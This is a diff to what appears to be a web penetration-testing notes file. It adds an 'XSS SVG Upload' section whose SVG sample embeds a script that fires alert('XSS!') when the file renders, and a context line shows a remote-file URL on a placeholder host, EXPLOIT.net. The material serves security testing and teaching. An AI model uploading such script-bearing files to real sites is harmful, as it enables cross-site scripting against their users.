@@ -2090,6 +2090,22 @@ fileurl=https://EXPLOIT.net/images.sVg
   
 >Need to identify PortSwigger research about RFI...  
   
+### XSS SVG Upload  
+
+>Uploading of SVG file that contains JavaScript that performs cross site scripting attack.  
+
+```xml
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <rect width="300" height="100" style="fill:rgb(255,0,0);stroke-width:3;stroke:rgb(0,0,0)" />
+   <script type="text/javascript">
+      alert("XSS!");
+   </script>
+</svg>
+```  
+  
 ## Deserialization  
 
 [CustomTemplate PHP](#customtemplate-php)  
